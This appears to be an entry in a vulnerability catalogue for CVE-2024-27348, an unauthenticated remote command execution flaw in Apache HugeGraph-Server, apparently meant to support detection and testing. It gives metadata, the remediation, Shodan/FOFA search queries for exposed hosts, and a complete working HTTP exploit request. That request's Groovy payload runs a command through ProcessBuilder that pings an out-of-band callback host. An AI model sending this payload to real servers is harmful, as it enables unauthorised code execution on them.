---
layout: post
cve_id: CVE-2024-27348
title: Apache HugeGraph-Server - Remote Command Execution
pcap: true
pcap_path: /pcaps/2024/CVE-2024-27348.pcap
nuclei_url: https://github.com/packetinside/nuclei-templates/blob/main/http/cves/2024/CVE-2024-27348.yaml
snort2_rule: N/A
snort3_rule: N/A
author: DhiyaneshDK
severity: high
impact: 'Unauthenticated attackers can execute arbitrary commands via the gremlin
  component in Apache HugeGraph-Server, potentially compromising the entire graph
  database system.

  '
remediation: 'Update Apache HugeGraph-Server to version 1.3.0 or later.

  '
reference:
- http://www.openwall.com/lists/oss-security/2024/04/22/3
- https://hugegraph.apache.org/docs/config/config-authentication/#configure-user-authentication
- https://lists.apache.org/thread/nx6g6htyhpgtzsocybm242781o8w5kq9
- https://github.com/Zeyad-Azima/CVE-2024-27348
- https://www.incibe.es/incibe-cert/alerta-temprana/vulnerabilidades/cve-2024-27348
- https://nvd.nist.gov/vuln/detail/CVE-2024-27348
classification:
  cve-id: CVE-2024-27348
  cwe-id: CWE-77
  epss-score: 0.94344
  epss-percentile: 0.99953
metadata:
  verified: true
  max-request: 1
  shodan-query: title:"HugeGraph"
  fofa-query: title="HugeGraph"
tags:
- cve
- cve2024
- hugegraph
- rce
- apache
- kev
- vkev
- vuln
---

## üîç Vulnerability Description
Apache HugeGraph-Server is an open-source graph database that provides a scalable and high-performance solution for managing and analyzing large-scale graph data. It is commonly used in Java8 and Java11 environments. However, versions prior to 1.3.0 are vulnerable to a remote command execution (RCE) vulnerability in the gremlin component.


## üåê HTTP Request
```nohighlight
POST /gremlin HTTP/1.1
Host: www.victim.com
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:109.0) Gecko/20100101 Firefox/113.0
Connection: close
Content-Length: 750
Content-Type: application/json
Accept-Encoding: gzip

{"gremlin": "Thread thread = Thread.currentThread();Class clz = Class.forName(\"java.lang.Thread\");java.lang.reflect.Field field = clz.getDeclaredField(\"name\");field.setAccessible(true);field.set(thread, \"SL7\");Class processBuilderClass = Class.forName(\"java.lang.ProcessBuilder\");java.lang.reflect.Constructor constructor = processBuilderClass.getConstructor(java.util.List.class);java.util.List command = java.util.Arrays.asList(\"ping\", \"d5jjeu9le0o3pr5ml6fg74zuxcgd3wocj.oast.online\");Object processBuilderInstance = constructor.newInstance(command);java.lang.reflect.Method startMethod = processBuilderClass.getMethod(\"start\");startMethod.invoke(processBuilderInstance);", "bindings": {}, "language": "gremlin-groovy", "aliases": {}}
```

